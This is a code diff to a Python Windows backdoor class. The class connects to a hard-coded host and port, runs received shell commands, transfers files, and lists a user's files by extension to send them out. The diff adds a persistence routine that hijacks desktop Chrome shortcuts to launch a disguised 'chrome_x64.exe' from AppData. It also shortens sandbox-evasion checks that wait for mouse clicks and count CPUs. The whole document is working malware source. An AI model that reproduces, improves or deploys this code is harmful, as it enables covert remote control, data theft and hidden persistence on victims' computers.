@@ -1,8 +1,11 @@
-import socket,subprocess,os,time,tempfile,multiprocessing
+import socket,subprocess,os,time,tempfile,multiprocessing,sys
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 from mss import mss
 from pynput.mouse import Listener
+import pythoncom
+from win32com.shell import shell, shellcon
+
 MAX = 1024
 
 class Backdoor:
@@ -80,11 +83,11 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
     def onclick(self, x, y, button, pressed):
         if pressed:
             self.click += 1
-            if self.click == 7:
+            if self.click == 4:
                 self.listener.stop()
 
     def evade(self):
-        time.sleep(300)
+        time.sleep(120)
         with Listener(on_click=self.onclick) as self.listener:
             self.listener.join()
         if multiprocessing.cpu_count() < 4:
@@ -188,13 +191,51 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
     def search(self, ext):
         home = os.path.expanduser("~")
         res = ""
-        for root, dirs, files in os.walk(home):
+        for root, dirr , files in os.walk(home):
             for file in files:
                 if file.endswith(ext):
                     res += os.path.join(root, file) + '\n'
         self.r_send(res)
 
+    def shortcut_path (self, shortcutfile):
+        link = pythoncom.CoCreateInstance (shell.CLSID_ShellLink,None,pythoncom.CLSCTX_INPROC_SERVER,shell.IID_IShellLink)
+        link.QueryInterface (pythoncom.IID_IPersistFile).Load (shortcutfile)
+        target_path, _ = link.GetPath (shell.SLGP_UNCPRIORITY)
+        return target_path
 
+    def modify_shortcut(self, filename,dest,appdata):
+        shortcut = pythoncom.CoCreateInstance (
+            shell.CLSID_ShellLink,
+            None,
+            pythoncom.CLSCTX_INPROC_SERVER,
+            shell.IID_IShellLink
+        )
+        desktop_path = shell.SHGetFolderPath (0, shellcon.CSIDL_DESKTOP, 0, 0)
+        shortcut_path = os.path.join (desktop_path, filename)
+        persist_file = shortcut.QueryInterface (pythoncom.IID_IPersistFile)
+        persist_file.Load (shortcut_path)
+        shortcut.SetPath(dest)
+        shortcut.SetWorkingDirectory (appdata)
+        persist_file.Save (shortcut_path, 0)
+
+    def persistence(self):
+        appdata = os.environ['appdata']
+        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        location = os.environ['appdata'] + "\\chrome_x64.exe"
+        if not os.path.exists(os.path.join(appdata,"chromelog.txt")):
+            os.chdir(desktop)
+            for f in os.listdir(desktop):
+                if "chrome" in f.lower():
+                    tar_path = self.shortcut_path(f)
+                    os.chdir(appdata)
+                    with open("chromelog.txt","w") as fp:
+                        fp.write(tar_path)
+                    self.modify_shortcut(f,location,appdata)
+        os.chdir(appdata)
+        with open("chromelog.txt",'r') as fp:
+            l = fp.readline()
+            os.startfile(l)
+        
     def run(self):
         self.connect(self.IP, self.PORT)
         while(True):
@@ -206,7 +247,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                 elif cmd[0] == "download":
                     filename = filename = ' '.join(cmd[1:])
                     self.upload(filename)
-                elif cmd[0] == "upload":
+                elif cmd[0] == "upload":    
                     filename = filename = ' '.join(cmd[1:])
                     self.download(filename)
                 elif cmd[0] == "terminate":
@@ -229,13 +270,12 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                     cmd = ' '.join(cmd)
                     result = self.exec_cmd(cmd)
                     self.r_send(result)
-
-
-            except Exception as e:
+            except:
                 self.connect(self.IP, self.PORT)
 
 
 
 backdoor = Backdoor("192.168.1.99",2000)
+backdoor.persistence()
 backdoor.evade()
 backdoor.run()
